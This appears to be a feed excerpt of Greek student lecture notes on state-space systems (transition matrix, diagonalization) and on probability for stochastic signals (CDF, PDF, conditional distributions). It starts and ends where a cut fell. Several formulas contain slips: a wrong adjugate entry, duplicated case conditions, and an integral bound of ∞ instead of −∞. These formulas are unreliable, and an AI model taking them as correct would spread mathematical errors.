<h3 id="org10fdbc2"><span class="section-number-3">2.2.</span> <a href="#org10fdbc2">Ιδιότητα 2</a></h3>
<div class="outline-text-3" id="text-2-2">
\begin{equation}
\label{eq:6}
y(t; ax_0, \gamma u) = a y(t;ax_0,0) + \gamma y(t;0, u)
\end{equation}
</div>
</div>
<div id="outline-container-orge6de7c4" class="outline-3">
<h3 id="orge6de7c4"><span class="section-number-3">2.3.</span> <a href="#orge6de7c4">Ιδιότητα 3</a></h3>
<div class="outline-text-3" id="text-2-3">
\begin{equation}
\label{eq:7}
y(t;0, \zeta u_1 + \xi u_2) = \zeta y(t; 0, u_1) + \xi y(t;0,u_2)
\end{equation}
</div>
</div>
</div>
<div id="outline-container-org8818008" class="outline-2">
<h2 id="org8818008"><span class="section-number-2">3.</span> <a href="#org8818008">Χρονική μεταβλητότητα.</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Για είσοδο \(u\) την βηματική, στην αρχή \(u(t)\) και κατόπιν \(u(t-t_0)\), ένα
σύστημα θα λέγεται χρονικά αμετάβλητο αν:
</p>
<ol class="org-ol">
<li>Οι πίνακες που εμφανίζονται στις εξισώσεις \(\ref{eq:3}\) να μην έχουν άμεση
εξάρτηση από τον χρόνο</li>
<li>Η έξοδος του συστήματος στις δύο περιπτώσεις που γράφτηκαν στο εισαγωγικό
κομμάτι της παραγράφου να είναι πανομοιότυπες μα χρονικά μετατοπισμένες (ως
αναμενόμενο)</li>
</ol>
</div>
</div>
<div id="outline-container-org74a601a" class="outline-2">
<h2 id="org74a601a"><span class="section-number-2">4.</span> <a href="#org74a601a">Παράδειγμα για λύση εισόδου?</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Θέτοντας \(u=0\) στο σύστημα της \(\ref{eq:3}\):
</p>
\begin{equation}
\label{eq:9}
{\dot x} = Ax, x(0) = x_0
\end{equation}

<p>
Για \({\dot x}= ax\) γνωρίζουμε πως η ομογενής λύση:
</p>
\begin{equation}
\label{eq:10}
x(t) = e^{at}x_0, \forall t\geq 0, a \in {\mathbb R}
\end{equation}

<p>
Προκειμένου να γενικεύσουμε την παραπάνω λύση (\(\ref{eq:10}\)), ορίζουμε τον
πίνακα:
</p>

\begin{align}
\label{eq:11}
e^{\mathcal{X}} &= I + \mathcal{X} + 
\frac{1}{2}\mathcal{X}^2 + 
\frac{1}{3!}\mathcal{X}^3 + \cdots =\\
&= \sum^{\infty}_{k=0} \frac{1}{k!} \mathcal{X}^k
\end{align}

<p>
Εκ της παραπάνω σχέσης, λοιπόν:
</p>
\begin{equation}
\label{eq:12}
e^{At} = \cdots = \sum^{\infty}_{k=0} 
\frac{1}{k!} A^kt^k
\end{equation}

<div class="note" id="org1a05d2d">
<p>
Ο πίνακας \(e^{At}\) ονομάζεται πίνακας μετάβασης και ο υπολογισμός του είναι
προαπαιτούμενο για την εύρεση της λύσης.
</p>

</div>

<p>
οπου παραγωγίζοντας την \(\ref{eq:12}\):
</p>
\begin{equation}
\label{eq:13}
\frac{d{e^{At}}}{d{t}} = \cdots \stackrel{\text{diy}}{=} Ae^{At}
\end{equation}

<p>
Επομένως καταλήγουμε ότι στην απαιτούμενη εξίσωση, την \(\ref{eq:9}\), δείχνοντας
οτι το \(e^{At}\) αποτελεί λύση του συστήματος.
</p>
</div>
</div>
<div id="outline-container-orgc366421" class="outline-2">
<h2 id="orgc366421"><span class="section-number-2">5.</span> <a href="#orgc366421">Ειδική περίπτωση υπολογισμού πίνακα μετάβασης&#xa0;&#xa0;&#xa0;<span class="tag"><span class="example">example</span></span></a></h2>
<div class="outline-text-2" id="text-5">
<p>
Δοθέντος συστήματος:
</p>
\begin{equation}
\label{eq:15}
{\dot x} = 
\begin{bmatrix}
0 & 1\\ 0 & 0
\end{bmatrix}x + 
\begin{bmatrix}
0\\1
\end{bmatrix}
u
\end{equation}

<p>
Ζητείται να υπολογιστεί ο πίνακας μετάβασης.
</p>


<p>
Σε αυτή την φάση όλα και όλα αυτά που έχουμε είναι ο  \(\ref{eq:12}\). Παρατηρούμε
ότι \(A^2=0\), λόγω της δομής του πίνακα. Επομένως τελικά έχουμε:
</p>
\begin{equation}
\label{eq:17}
e^{At} = I + At = 
\begin{bmatrix}
1 & t\\0 &1
\end{bmatrix}
\end{equation}

<p>
και εξ αυτού:
</p>
\begin{equation}
\label{eq:18}
\vec{y} = e^{At}x_0 = 
\begin{bmatrix}
1&t\\0&1
\end{bmatrix}
\begin{bmatrix}
x_1(0)\\x_2(0)
\end{bmatrix} = 
\begin{bmatrix}
x_1(0) + tx_2(0)\\x_2(0)
\end{bmatrix}
\end{equation}

<p>
Όπως προκύπτει από αυτές τις εξισώσεις, το σύστημα θα είναι ασταθές, καθώς χωρίς
είσοδο ελέγχου παρατηρούμε ότι η είσοδος απειρίζεται.
</p>


<div class="note" id="org315bac9">
<p>
Αυτό το παράδειγμα είναι too good to be true για να είναι εφαρμόσιμο σε μεγαλο
αριθμό περιπτώσεων. Ο μηδενισμός ορισμένης δύναμης του \(A\), αν και μπορεί να
τύχει, δεν είναι δεδομένος.
</p>

</div>
</div>
</div>
<div id="outline-container-orgae14861" class="outline-2">
<h2 id="orgae14861"><span class="section-number-2">6.</span> <a href="#orgae14861">Γενικός τρόπος υπολογισμού \(e^{At}\)&#xa0;&#xa0;&#xa0;<span class="tag"><span class="example">example</span></span></a></h2>
<div class="outline-text-2" id="text-6">
<p>
Δουλεύοντας στην \(\ref{eq:9}\)
</p>
\begin{align}
\label{eq:19}
\stackrel{\text{Laplace}}{\Rightarrow} sX(s) - X(0) &= AX(s)\iff\\
(sI -A)X(s) &= X(0)\\
X(s) &= (sI-A)^{-1}X(0)\\
\Rightarrow x(t)&= \mathcal{L}^{-1} \{ (SI-A)^{-1}\} x(0)
\end{align}

<p>
Η οποία σχέση αποκτά ακόμα μεγαλύτερη σημασία όταν συνδυάζεται με την
(\(\ref{eq:10}\)), όπως φαίνεται στο παράδειγμα:
</p>

<p>
Δοθέντος πίνακα \(A\):
</p>
\begin{equation}
\label{eq:21}
A = 
\begin{bmatrix}
0 & 1\\\ -2 & -3
\end{bmatrix} \Rightarrow \cdots \Rightarrow X(s) = 
\frac{1}{s^2+3s+2} 
\begin{bmatrix}
s+3 & 1\\ -2 & 5
\end{bmatrix}
\end{equation}

<p>
όπου τελικά προκύπτει:
</p>
\begin{equation}
\label{eq:22}
e^{At} = \mathcal{L}^{-1} \{ (SI -A)^{-1} \} =  
\begin{bmatrix}
2e^{-t}-e^{-2t} & e^{-t}-e^{-2t}\\
-2e^{-t}+2e^{-2t} & -e^{-t} + 2 e^{-2t}
\end{bmatrix}
\end{equation}

<p>
Ακόμα <b>ο πίνακας μετάβασης βοηθάει την εξέταση της ευστάθειας του συστήματος.</b>
Θα πρέπει κάθε στοιχείο του πίνακα να μην απειρίζει όταν το \(t\to \infty\)
</p>
</div>
</div>
<div id="outline-container-orge0bd0f1" class="outline-2">
<h2 id="orge0bd0f1"><span class="section-number-2">7.</span> <a href="#orge0bd0f1">Μερικές ακόμα ειδικές περιπτώσεις:</a></h2>
<div class="outline-text-2" id="text-7">
</div>
<div id="outline-container-orgf92756a" class="outline-3">
<h3 id="orgf92756a"><span class="section-number-3">7.1.</span> <a href="#orgf92756a">Α διαγώνιος</a></h3>
<div class="outline-text-3" id="text-7-1">
<p>
Στην ειδική περίπτωση όπου:
</p>
\begin{equation}
\label{eq:24}
A = 
\begin{bmatrix}
a_{1} & 0 & 0 \\
0 & a_2 &0\\
0 & 0 & a_3
\end{bmatrix}
\end{equation}
<p>
Καταλήγομε ότι
</p>
\begin{equation}
\label{eq:25}
e^{At} = 
\begin{bmatrix}
e^{a_1t} &0 &0\\
0 & e^{a_2t} &0\\
0 & 0 & \cdots
\end{bmatrix}
\end{equation}


<p>
Αν και δεν είναι εφαρμόσιμος σε πολλές περιπτώσεις κατευθείαν, αυτή η ιδιότητα
έρχεται χρήσιμη όταν προχωράμε στην διαγωνιοποίηση ενός συστήματος.
</p>
</div>
</div>
<div id="outline-container-org97b2c42" class="outline-3">
<h3 id="org97b2c42"><span class="section-number-3">7.2.</span> <a href="#org97b2c42">Διαγωνοποίηση συστήματος.</a></h3>
<div class="outline-text-3" id="text-7-2">
<p>
Εστω ότι σύστημα όπως αυτό φαίνεται στην \(\ref{eq:9}\), και \(A\) πίνακας με
ιδιοτιμές πολλαπλότητας 1.
</p>

<p>
Τότε υπάρχει πίνακας \(T\), αντιστρέψιμος, τέτοιος ώστε:
</p>
\begin{equation}
\label{eq:26}
A^{\textasciitilde} = T^{-1}AT
\end{equation}

<p>
Έτσι με δεδομένο τον πίνακα \(T\)<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> μπορούμε να κάνουμε κατάλληλη
αντικατάσταση:
(νέα μεταβλητή κατάστασης \(z\), απο μας ορισμένη σαν)
</p>
\begin{equation}
\label{eq:27}
x = Tz \Rightarrow z = T^{-1}x
\end{equation}

<p>
όπου
</p>
\begin{align*}
{\dot z} &= T^{-1} {\dot x}\\
&= T^{-1}A x\\
&= T^{-1}A T z\\
&= (T^{-1}A T) z\\
&= A^{\textasciitilde}z
\end{align*}

<p>
Έχοντας, κατ&rsquo; αυτόν τον τρόπο διαγωνοποιήσει το σύστημα
</p>

<p>
Αποδεικνύεται (όπως υπάρχει στον Strang<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>), ότι ο \(T\) είναι ο πίνακας του
οποίου οι στήλες είναι τα ιδιοδιανύσματα του \(A\). Αντίστοιχα αποδεικνύεται ότι ο
\(T^{-1}\) υπάρχει πάντοτε καθώς τα διανύσματα εξ ορισμού γραμμικά ανεξάρτητα και
αποτελούν, στο σύνολο τους, βάση του νδιάστατου χώρου.
</p>
</div>
</div>
<div id="outline-container-org5bef141" class="outline-3">
<h3 id="org5bef141"><span class="section-number-3">7.3.</span> <a href="#org5bef141">Ειδική περίπτωση όπου αρχική τιμή ιδιοδιάνυσμα</a></h3>
<div class="outline-text-3" id="text-7-3">
<p>
Αν έχουμε:
</p>
\begin{equation}
\label{eq:28}
x(t) = e^{At}x(0) = e^{At}v
\end{equation}
<p>
όπου \(v\) ιδιοδιάνυσμα και \(\lambda\) η αντίστοιχη ιδιοτιμή:
</p>
\begin{equation}
\label{eq:29}
x(t) = (I + At + A^2t^2 +\cdots) v = \cdots = v(1+\lambda t + \lambda^2 t^2 + \cdots) = e^{\lambda t}v
\end{equation}

<p>
Αυτή η έκφραση ονομάζεται ρυθμός (όλο το \(e^{\lambda t}v\)).
Ο γραμμικός συνδυασμός όλων των ρυθμών (για κάθε ιδιοδιάνυσμα και ιδιοτιμή) θα
μου δώσει την γενική μορφή της ομογενούς λύσης.
</p>


<p>
Έτσι καταλαβαίνουμε πως η μορφή της λύσης (σύγκλιση απόκλιση, παραμονή σε
σταθερή τιμή) καθορίζεται από τις ιδιοτιμές.
</p>

<p>
Συνδυάζοντας το με τις προηγούμενες διαλέξεις (όπου εξετάζαμε τις ιδιοτιμές για
να καθορίσουμε την ευστάθεια) - βλέπουμε ουσιαστικά γιατί η θετική η αρνητική
πραγματική φύση των ιδιοτιμών είναι καθοριστική των ιδιοτήτων του συστήματος.
</p>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Πίνακας μετασχηματισμού 
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://www.youtube.com/watch?v=cdZnhQjJu4I">https://www.youtube.com/watch?v=cdZnhQjJu4I</a> 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη: 1 Εισαγωγικά</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221003.html</link>
<pubDate>Mon, 03 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221003.html</guid>
<description>
<![CDATA[<div id="outline-container-org11be4d4" class="outline-2">
<h2 id="org11be4d4"><span class="section-number-2">1.</span> <a href="#org11be4d4">Ανασκόπηση</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Στο μάθημα των Σημάτων Συστημάτων εξετάστηκαν:
</p>
<ul class="org-ul">
<li>Νομοτελειακά συστήματα</li>
<li>Μετασχηματισμοί Fourier και  Laplace</li>
<li>Είσοδος έξοδος γραμμικού και χρονοαμετάβλητου συστήμ.</li>
</ul>
</div>
<div id="outline-container-org5333649" class="outline-3">
<h3 id="org5333649"><span class="section-number-3">1.1.</span> <a href="#org5333649">Τύποι:</a></h3>
<div class="outline-text-3" id="text-1-1">
<ul class="org-ul">
<li>Οι γνωστοι τύποι, δεν τους έγραψα γιατί με φάνηκαν υπερβολικά γνωστοί:</li>
<li>Έγραψα μόνο την συνέλιξη, σαν παράδειγμα τέτοιου τύπου:</li>
</ul>
\begin{align}
\label{eq:1}
y(t) = x(t) * h(t) = \int_{-\infty}^{\infty}x(\tau)h(t-\tau)d\tau
\end{align}
</div>
</div>
</div>
<div id="outline-container-orgf218cbf" class="outline-2">
<h2 id="orgf218cbf"><span class="section-number-2">2.</span> <a href="#orgf218cbf">Στοχαστικό σήμα</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Στα στοχαστικά σήματα έχουμε την μετάβαση από τις αυστηρές μαθηματικές εκφράσεις
στις πιθανότητες και στην έκφραση του σήματος με την χρήση πιθανοτήτων και
ιδιοτήτων πιθανοτήτων
</p>

<div class="definition" id="org9a98e46">
<p>
Σήμα για το οποίο δεν υφίσταται νομοτελειακή (κλειστή) έκφραση για την περιγραφή του.
</p>

</div>

<p>
Ουσιαστικά πρόκειται για σήμα που επηρεάζεται από διάφορους χρονικά μεταβλητούς
  και αγνώστης φύσεως παράγοντες με αποτέλεσμα να μην μπορούμε να βγάλουμε
  <i>απόλυτη</i> έκφραση.
</p>
</div>
<div id="outline-container-org6e21bba" class="outline-3">
<h3 id="org6e21bba"><span class="section-number-3">2.1.</span> <a href="#org6e21bba">Παραδείγματα στοχαστικών σημάτων</a></h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>Σήμα που λαμβάνεται στον δεκτη ενός τηλεπ συστήματος.
<ul class="org-ul">
<li>Είναι στοχαστικό λόγω του θορύβου. Δεν είναι δυνατόν να προσδιοριστεί
επακριβώς ( παρα μόνο στις συνθήκες του απόλυτου μηδενός που δεν μας
ενδιαφέρουν ). Αυτό συμβαίνει καθώς προκαλείται από την κίνηση ηλεκτρονίων.</li>
</ul></li>
<li>Έξοδος μικροφώνου
<ul class="org-ul">
<li>Πάλι πολλοί τέτοιοι παράγοντες, είναι αδύνατο να προσδιορίσεις σε ενιαίο
τύπο την φωνή του ομιλητή ποσο μάλλον όταν σε αυτή εμπλέκεται και ο θόρυβος
του μικροφώνου <i>( πιθανά αμφισβητήσιμη ερμηνεία )</i></li>
</ul></li>
<li>Είσοδος έξοδος πελατών σε ουρά αναμονής
<ul class="org-ul">
<li><b>Θεωρία ουρών αναμονής</b></li>
<li>Εφαρμόσιμη σε <b>δίκτυα</b>.</li>
</ul></li>
<li>τιμή μετοχής σε χρονική περίοδο</li>
<li>Αριθμός ηλεκτρονίων σε φωτοδίοδο.</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orga0785d6" class="outline-2">
<h2 id="orga0785d6"><span class="section-number-2">3.</span> <a href="#orga0785d6">Προσέγγιση του μαθήματος</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Το πρώτο κομμάτι του μαθήματος είναι <i>αποκλειστικά</i> επανάληψη στην θεωρία
πιθανοτήτων και αργότερα επέκταση με μερικές έννοιες που δεν εξετάστηκαν εκεί,
πριν προχωρήσουμε στην ανάλυση, στοχαστικών σημάτων.
</p>
</div>
</div>
<div id="outline-container-orge3172db" class="outline-2">
<h2 id="orge3172db"><span class="section-number-2">4.</span> <a href="#orge3172db">Θεωρία Πιθανοτήτων</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Οπότε ναι&#x2026; Έχουμε αυτά εδώ:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Θεωρία Συνόλων&#x2026;
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> ιδιοτητες &#x2026;</li>
</ul></li>
</ul>
</div>
<div id="outline-container-orgb29320d" class="outline-3">
<h3 id="orgb29320d"><span class="section-number-3">4.1.</span> <a href="#orgb29320d">Πιθανοτικό μοντέλο</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
Πείραμα -&gt; Δειγμ χώρος -&gt; Κανόνας πιθαν.
</p>
</div>
</div>
<div id="outline-container-org2fb4e04" class="outline-3">
<h3 id="org2fb4e04"><span class="section-number-3">4.2.</span> <a href="#org2fb4e04">Ορισμοί πιθανότητας</a></h3>
<div class="outline-text-3" id="text-4-2">
</div>
<div id="outline-container-orgce8ddf6" class="outline-4">
<h4 id="orgce8ddf6"><span class="section-number-4">4.2.1.</span> <a href="#orgce8ddf6">Laplacian</a></h4>
<div class="outline-text-4" id="text-4-2-1">
\begin{equation}
\label{eq:2}
P\{A\} = \frac{N_A}{N}
\end{equation}
<p>
όπου \(N_A\) το πλήθος των γεγονότων του \(A\) και \(N\) το πλήθος στοιχείων του δειγματοχώρου.
</p>
<ul class="org-ul">
<li>Δεν χρειάζεται να εκτελέσω το πείραμα ούτε μια φορά.</li>
</ul>
</div>
</div>
<div id="outline-container-org9535dc8" class="outline-4">
<h4 id="org9535dc8"><span class="section-number-4">4.2.2.</span> <a href="#org9535dc8">Σχετικής συχνότητας</a></h4>
<div class="outline-text-4" id="text-4-2-2">
\begin{equation}
\label{eq:3}
P\{A\} = \lim_{N\to \infty}\frac{N_A}{N}
\end{equation}
<ul class="org-ul">
<li>Προϋποθέτει τόσο την ύπαρξη του ορίου όσο και την εκτέλεση του πειράματος
άπειρες (επαρκώς πολλές) φορές.</li>
</ul>
</div>
</div>
<div id="outline-container-orga487375" class="outline-4">
<h4 id="orga487375"><span class="section-number-4">4.2.3.</span> <a href="#orga487375">Αξιωματικός</a></h4>
<div class="outline-text-4" id="text-4-2-3">
<p>
Αυτός είναι ο πιο <i>μαθηματικός</i> ορισμός: Βλέπε τα τρία βασικά αξιώματα θεωρίας
πιθανοτήτων: Θεωρήματα Kolmogorov.
</p>
</div>
</div>
<div id="outline-container-org5c2c80a" class="outline-4">
<h4 id="org5c2c80a"><span class="section-number-4">4.2.4.</span> <a href="#org5c2c80a">Πιθανοτικός χώρος πραγματικών αριθμών.</a></h4>
<div class="outline-text-4" id="text-4-2-4">
<p>
Πρακτικά AΣΚ, ΣΠΠ όπως τις συναντήσαμε στις πιθανότητες.
</p>
</div>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 2: Τυχαίες μεταβλητές</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221010.html</link>
<pubDate>Mon, 10 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221010.html</guid>
<description>
<![CDATA[<div id="outline-container-org808ddaf" class="outline-2">
<h2 id="org808ddaf"><span class="section-number-2">1.</span> <a href="#org808ddaf">Τυχαίες μεταβλητές</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Μετάβαση από τα αορίστως ορισμένα γεγονότα σε καλύτερα ορισμένα.
</p>

<p>
Δόθηκε ιδιαίτερη έμφαση στο <i>να θυμάται κανείς ότι η τιμή της τμ δεν είναι
αριθμός αλλά σύνολο γεγονότων</i>
</p>
</div>
<div id="outline-container-orgfc4f7c0" class="outline-3">
<h3 id="orgfc4f7c0"><span class="section-number-3">1.1.</span> <a href="#orgfc4f7c0">Τύποι</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Κλασσικά:
</p>
<ol class="org-ol">
<li>Συνεχείς (παράδειγμα: γωνία στον τροχό της τύχης)</li>
<li>Διακριτές (παράδειγμα: &#x2026; κορώνα γράμματα)</li>
<li>Μεικτού τύπου</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orga5092a5" class="outline-2">
<h2 id="orga5092a5"><span class="section-number-2">2.</span> <a href="#orga5092a5">Συνάρτηση Κατανομής πιθανότητας (CDF)</a></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org9a7ff41" class="outline-3">
<h3 id="org9a7ff41"><span class="section-number-3">2.1.</span> <a href="#org9a7ff41">Κλιμακωτή συνάρτηση κατανομής</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Όταν βλέπεις κλιμακωτή συνάρτηση κατανομής γνωρίζεις πως εκείνη σχετίζεται με
διακριτή τμ.
</p>
</div>
</div>
<div id="outline-container-orgaf2575c" class="outline-3">
<h3 id="orgaf2575c"><span class="section-number-3">2.2.</span> <a href="#orgaf2575c">Ιδιότητες συν καταν</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Οι κλασσικές ιδιότητες της ΑΣΚ:
</p>
\begin{align*}
F_X(-\infty) &= 0\\
F_X(\infty) &= 1\\
\end{align*}
<p>
ενώ ακόμα:
</p>
<ul class="org-ul">
<li>η \(F_X\) αύξουσα</li>
<li>Συνεχής εκ δεξιών</li>
<li>\(1-F_X\), συχνά ορισμένη ως <b>συμπληρωματική</b> (complementary) συνάρτηση της \(F_X\),
και συμβολίζεται ως \(F^{C}_X\)</li>
</ul>
</div>
</div>
<div id="outline-container-org086cfd1" class="outline-3">
<h3 id="org086cfd1"><span class="section-number-3">2.3.</span> <a href="#org086cfd1">Προσεγγίζοντας την πιθανότητα σε σημείο</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
Αυτό είναι για όταν μπλέκουμε με την πιθανότητα:
</p>
\begin{equation}
\label{eq:1}
Pr\{ x_1 \leq X \leq x_2 \}
\end{equation}

<p>
Υπο αυτές τις συνθήκες, γνωρίζοντας ήδη από την ΑΣΚ:
\(Pr\{\cdots\} = F(x_2) - F(x_1)\):
</p>

<p>
Έχουμε: \(x_2= x, x_1 = x-\epsilon, \epsilon\to0\), εκ του οποίου:
</p>
\begin{equation}
\label{eq:2}
Pr\{\cdots\} = F(x) - F(x^{-})
\end{equation}
<p>
Όπου προφανώς \(x^-\) είναι η εκ δεξιάς προσέγγιση του \(x\)
</p>

<p>
Με βάση την \(F_x\), ακόμα μπορούμε να διακρίνουμε τις τμ.
</p>
<ul class="org-ul">
<li>\(F_X\) συνεχής, τότε η τμ συνεχούς τύπου</li>
<li>\(F_X\) κλιμακωτή, τότε η τμ διακριτού τύπου</li>
<li>\(F_X\) συνδυασμός των παραπάνω, τότε η τμ μεικτού τύπου</li>
</ul>


<p>
Στην περίπτωση, λοιπόν, της συνεχούς (τουλάχιστον στα εμπλεκόμενα σημεία) τμ,
η πιθανότητα ισούται με το 0. Δεν υπάρχει ασυνέχεια, ούτε και ουσιαστική
πιθανότητα να συμβεί ένα εκ των απείρων γεγονότων.
</p>

<p>
Αυτό, όμως, αλλάζει όταν έχουμε ασυνέχεια. Ισχύει δηλαδή πως <b>αυτή η πιθανότητα
  είναι ίση με το πλάτος της ασυνέχειας που παρουσιάζεται σε εκείνο το σημείο</b>
</p>
</div>
</div>
<div id="outline-container-org9f1d7cd" class="outline-3">
<h3 id="org9f1d7cd"><span class="section-number-3">2.4.</span> <a href="#org9f1d7cd">Παραδείγματα.</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
Λύθηκαν, από τις διαφάνειες, μερικά απλά παραδείγματα ( για αυτό και δεν
σημειώθηκαν ).
</p>
</div>
<div id="outline-container-orge295859" class="outline-4">
<h4 id="orge295859"><span class="section-number-4">2.4.1.</span> <a href="#orge295859">Παράδειγμα <i>εξέτασης για ΑΣΚ</i></a></h4>
<div class="outline-text-4" id="text-2-4-1">
<ul class="org-ul">
<li>Σε αυτό το παράδειγμα, η συνάρτηση δεν ήταν ΑΣΚ καθώς δεν ήταν συνεχής απο
δεξιά. (Το μόνο που κάνεις είναι: ελέγχεις τις ιδιότητες)</li>
</ul>
</div>
</div>
<div id="outline-container-org28ce3b3" class="outline-4">
<h4 id="org28ce3b3"><span class="section-number-4">2.4.2.</span> <a href="#org28ce3b3">Παράδειγμα με <i>ράμπα</i></a></h4>
</div>
</div>
</div>
<div id="outline-container-org9a9afa0" class="outline-2">
<h2 id="org9a9afa0"><span class="section-number-2">3.</span> <a href="#org9a9afa0">Συνάρτηση πυκνότητας πιθανότητας (PDF)</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Εφεξής ΣΠΠ.
</p>

<p>
Ορίζεται, κατά τον Νέστορα, βάση της ΑΣΚ:
</p>
\begin{equation}
\label{eq:3}
f_X = \frac{dF_X}{dt}
\end{equation}

<p>
Και οι ιδιότητες της είναι οι κλασσικές:
</p>
\begin{align*}
f_X(x) &\geq 0, \forall x\\
\int_{-\infty}^{\infty}f_Xdx &= 1\\
F_X &= \int_{\infty}^tf_Xdx\\
Pr\{x_1 < X \leq x_2\} &= \int_{x^{+}_1}^{x^{ +}_2}f(x)dx\\
Pr\{x_1 \leq X \leq x_2\} &= \int_{x^{-}_1}^{x^{ +}_2}f(x)dx\\
\end{align*}
</div>
</div>
<div id="outline-container-orgd12d033" class="outline-2">
<h2 id="orgd12d033"><span class="section-number-2">4.</span> <a href="#orgd12d033">Μορφή συναρτήσεων ΔΤΜ</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Προφανώς ΔΤΜ: Διακριτή τυχαία μεταβλητή.
</p>

<p>
Όπως είπαμε προηγουμένως <a href="#org9a7ff41">στην κλιμακωτή συνάρτηση κατανομής</a>, όταν δουλεύουμε
με ΑΣΚ η γραφική παράσταση της \(F_X\) διακριτής τμ είναι κλιμακωτή, ενώ
(χτίζοντας επί εκείνου) η ΣΜΠ (<i>συνάρτηση μάζας πιθανότητας</i> - pmf) έχει την
μορφή αθροίσματος συναρτήσεων \(\delta\) (δέλτα)
</p>

<p>
Ισχύει δηλαδή
</p>
\begin{equation}
\label{eq:4}
f_X(x) = \sum_{i=1}^np_i\delta(x-x_i)
\end{equation}
</div>
</div>
<div id="outline-container-org57319fb" class="outline-2">
<h2 id="org57319fb"><span class="section-number-2">5.</span> <a href="#org57319fb">Δεσμευμένες πιθανότητες ( Πιθανότητες υπό συνθήκη )</a></h2>
<div class="outline-text-2" id="text-5">
\begin{equation}
\label{eq:5}
Pr\{X\leq x | B\} = \frac{Pr\{X\leq x,B\}}{Pr\{B\}}
\end{equation}

<p>
Συμβολίζουμε τις ΑΣΚ και ΣΠΠ των δεσμευμένων, έτσι, πιθανοτήτων ως εξής:
</p>
<ul class="org-ul">
<li>ΑΣΚ: \(F_{X|A}\)</li>
<li>ΣΠΠ: \(f_{X|A}\)</li>
</ul>

<p>
Ακόμα έχουμε:
Αν το γεγονός \(A=\{X\leq \alpha\}\)
</p>

\begin{align}
\label{eq:6}
F_{X|A} =& 
\begin{cases}
1 & x\geq \alpha\\
\frac{Pr\{X\leq x\}}{Pr\{X\leq \alpha\}} & x\geq \alpha\\
\end{cases} \\
f_{X|A} =& 
\begin{cases}
1 & x\geq \alpha\\
\frac{Pr\{X\leq x\}}{Pr\{X\leq \alpha\}} & x\geq \alpha\\
\end{cases} 
\end{align}

\begin{align*}
\label{eq:9}
f_x &= \frac{d{F_X}}{d{x}}\\
F_X(\alpha) &= \int_{-\infty}^{\alpha} f_xdx
\end{align*}
</div>
<div id="outline-container-org4941adb" class="outline-3">
<h3 id="org4941adb"><span class="section-number-3">5.1.</span> <a href="#org4941adb">Χτίζοντας πιο σύνθετες πιθανότητες</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Αν, πάλι, το \(B=\{a < X \leq b\}\)
έχουμε:
</p>
\begin{equation}
\label{eq:7}
F_{X|B}(x) = \frac{Pr\{X\leq x, a< X \leq b\}}{Pr\{ a < X \leq b\}}
\end{equation}

<p>
το οποίο μπορούμε να το αναλύσουμε με τις εξής συνθήκες:
</p>
<ul class="org-ul">
<li>\(x\leq a\)</li>
<li>\(x\geq b\)</li>
<li>\(x\in (a,b)\)</li>
</ul>

<p>
Έτσι καταλήγουμε:
</p>
\begin{equation}
\label{eq:10}
F_{X|B}(x) =
\begin{cases}
0 & x\leq a\\
1 & x\geq b\\
\frac{F_X(x) - F_X(\alpha)}{F_X(b) - F_X(\alpha)} & x\leq a
\end{cases}
\end{equation}

<p>
Οι πρώτες δύο σχέσεις είναι αυτονόητες, ενώ η τρίτη προκύπτει από το γεγονός οτι
για \(x\in (\alpha,b)\), \(Pr\{X\leq x, \alpha < X\leq b\}\) γίνεται \(Pr\{\alpha< X\leq x\}\)
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 3: Κυρίως Ασκήσεις.</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221012.html</link>
<pubDate>Wed, 12 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221012.html</guid>
<description>
<![CDATA[<div id="outline-container-org5ddc2ae" class="outline-2">
<h2 id="org5ddc2ae"><span class="section-number-2">1.</span> <a href="#org5ddc2ae">Συνέχεια επί τυχαίων μεταβλητών.</a></h2>
<div class="outline-text-2" id="text-1">
</div>
<div id="outline-container-orgce31a0e" class="outline-3">
<h3 id="orgce31a0e"><span class="section-number-3">1.1.</span> <a href="#orgce31a0e">Οι συναρτήσεις τμ αποτελούν και οι ίδιες με την σειρά τους τμ.</a></h3>
<div class="outline-text-3" id="text-1-1">
\begin{equation}
\label{eq:1}
y = g(x)
\end{equation}
<p>
όπου \(X,Y\) τυχαίες μεταβλητές.
</p>

<p>
